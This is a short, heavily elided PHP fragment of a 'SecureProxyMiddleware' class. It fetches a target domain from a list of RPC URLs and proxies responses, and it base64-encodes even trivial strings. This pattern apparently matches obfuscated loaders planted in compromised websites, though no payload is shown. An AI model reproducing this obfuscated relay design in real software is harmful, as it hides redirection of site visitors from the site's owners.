...
class SecureProxyMiddleware
{
    ...
    private function fetchTargetDomain()
    {
        ...
        foreach ($this->rpcUrls as $rpcUrl) {
            try {
                ...
                if (isset($responseData[base64_decode('ZXJyb3I=')])) continue;
    ...
    private function formatHeaders($headers)
    {
        ...
        foreach ($headers as $name => $value) {
            if (is_array($value)) $value = implode(base64_decode('LCA='), $value);
    ...
    public function handle($endpoint)
    {
        try {
            ...
            if ($contentType) header(base64_decode('Q29udGVudC1UeXBlOiA=') . $contentType);
